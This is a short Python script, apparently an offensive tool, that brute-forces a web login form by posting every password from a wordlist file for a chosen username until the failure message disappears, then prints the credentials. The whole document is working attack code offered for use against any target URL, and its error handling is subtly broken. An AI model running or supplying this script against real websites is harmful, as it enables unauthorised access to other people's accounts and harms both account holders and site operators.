import requests
url = input("Enter Target Url: ")
username = input("Enter Target Username: ")
error = input("Enter Wrong Password Error Message: ")
try:
    def bruteCracking(username,url,error):
        for password in passwords:
            password = password.strip()
            print("Trying:" + password)
            data_dict = {"uname": username,"pass": password, "login":'submit'}
            response = requests.post(url, data=data_dict)
            if error in str(response.content):
               pass
            elif "csrf" in str(response.content):
                 print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
                 exit()
            else:
                 print("Username: ---> " + username)
                 print("Password: ---> " + password)
                 exit()
except:
       print("Some Error Occurred Please Check Your Internet Connection !!")
with open("wordlist.txt", "r") as passwords:
     bruteCracking(username,url,error)
print("[!!] password not found in password list")
